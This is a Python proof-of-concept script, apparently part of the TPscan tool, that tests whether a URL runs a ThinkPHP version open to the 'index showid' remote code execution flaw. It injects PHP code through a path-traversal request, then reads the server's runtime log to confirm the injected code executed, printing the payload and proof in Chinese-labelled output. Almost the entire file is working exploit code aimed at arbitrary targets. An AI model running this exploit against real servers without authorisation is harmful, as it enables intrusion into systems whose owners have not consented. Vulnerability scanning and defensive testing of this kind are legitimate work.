#!/usr/bin/env python
# coding=utf-8
import urllib
import datetime
import requests
import urllib3

urllib3.disable_warnings()
from termcolor import colored


def thinkphp_index_showid_rce_verify(url):
    """thinkphp_index_showid_rce_verify"""
    pocdict = {
        "vulnname": "thinkphp_index_showid_rce",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": 'TPscan',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
        vurl2 = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(timenow))
        req2 = requests.get(vurl2, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a3" in req2.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a3 found'
            pocdict['response'] = req2.status_code
            print(colored("[+] 目标存在 thinkphp_index_showid_rce 漏洞\tpayload: ", "green"))
            print(colored(pocdict, 'green'))
        else:
            print(colored("\n[*] 目标不存在 thinkphp_index_showid_rce", "red"))
    except:
        pass
